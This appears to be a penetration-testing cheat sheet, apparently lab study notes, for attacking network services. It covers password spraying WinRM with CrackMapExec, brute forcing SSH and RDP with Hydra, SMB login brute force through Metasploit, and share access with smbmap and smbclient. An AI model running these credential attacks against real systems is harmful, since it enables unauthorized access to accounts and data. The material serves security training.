# Attacking Network Services
```table-of-contents
```
## Common Service Ports
| **Service** | **Port(s)**                                | **Transport** | **Description**                 |
| ----------- | ------------------------------------------ | ------------- | ------------------------------- |
| `FTP`     | 21                                         | TCP           | File Transfer Protocol          |
| `SSH`     | 22                                         | TCP           | Secure Shell                    |
| `Telnet`  | 23                                         | TCP           | Unencrypted text communications |
| `SMTP`    | 25                                         | TCP           | Simple Mail Transfer Protocol   |
| `SMB`     | 139, 445                                   | TCP           | Server Message Block            |
| `RDP`     | 3389                                       | TCP/UDP       | Remote Desktop Protocol         |
| `WinRM`   | 5985 (HTTP)<br><br>  <br><br>5986 (HTTPS)  | TCP           | Windows Remote Management       |
| `SQL`     | 1433 (MSSQL)<br><br>  <br><br>3306 (MySQL) | TCP           | Database Services               |
## WinRM (Windows Remote Management)
### Enumeration & Spraying (CrackMapExec)
```shell
# General Syntax
crackmapexec <protocol> <target> -u <user> -p <password>

# Password Spraying / Brute Force WinRM
crackmapexec winrm 10.129.42.197 -u user.list -p password.list

# Check if credentials allow code execution (Look for "Pwn3d!")
# Output example: [+] None\user:password (Pwn3d!)
```
### Access & Execution (Evil-WinRM)
```shell
# Install
sudo gem install evil-winrm

# Connect
evil-winrm -i <target-IP> -u <username> -p <password>
```
## SSH (Secure Shell)
### Brute Forcing with Hydra
```shell
# Brute Force SSH
# -L: list of users, -P: list of passwords, -t: threads
hydra -L user.list -P password.list -t 4 ssh://10.129.42.197
```
### Accessing SSH
```shell
# Standard connection
ssh user@10.129.42.197

# Handle "Host Key Verification Failed" (if re-using IP)
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" user@IP
```
## RDP (Remote Desktop Protocol)
### Brute Forcing RDP
```shell
# Brute Force RDP with Hydra
hydra -L user.list -P password.list rdp://10.129.42.197
```
### Accessing RDP (xFreeRDP)
```shell
# Connect with credentials
# /v: Server, /u: Username, /p: Password, /cert:ignore (auto accept cert)
xfreerdp /v:10.129.42.197 /u:user /p:password /cert:ignore

# Drive redirection (Mount local folder to remote)
xfreerdp /v:10.129.42.197 /u:user /p:pass /drive:sharename,/home/kali/share
```
## SMB (Server Message Block)
### Brute Forcing SMB
#### Using Metasploit
```shell
msfconsole -q
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.129.42.197
set USER_FILE user.list
set PASS_FILE password.list
run
```
#### Using CrackMapExec (CME)
```shell
# Spray credentials and list shares
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```
### Enumerating & Accessing Shares
#### Smbmap
```shell
# List shares and permissions
smbmap -H 10.129.202.136 -u john -p 'november'
```
#### Smbclient
```shell
# Connect to a specific share
smbclient -U user //10.129.42.197/SHARENAME

# Commands inside smbclient:
# ls      - List files
# get     - Download file
# put     - Upload file
```